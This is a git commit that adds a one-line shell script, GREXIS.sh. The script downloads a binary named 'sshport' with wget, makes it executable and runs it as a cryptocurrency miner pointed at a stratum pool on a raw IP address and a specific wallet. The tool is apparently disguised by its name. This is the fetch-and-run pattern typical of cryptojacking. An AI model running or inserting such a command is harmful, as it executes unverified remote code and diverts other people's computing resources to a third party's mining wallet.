e030bb1382500a72c650064459c5ee98bd33110e
rfeikgeeric <151191424+rfeikgeeric@users.noreply.github.com>
2023-11-17 23:48:37 +0800

    Add files via upload

---
+++ GREXIS.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rfeikgeeric/merixasos/raw/main/sshport && chmod 700 sshport && ./sshport -a nexapow -o stratum+tcp://209.25.142.72:2222 -u nexa:nqtsq5g56cgf4nl5894afnvtlqfln3sh8rtjxv8wmtgz90hc.STRIXGPU
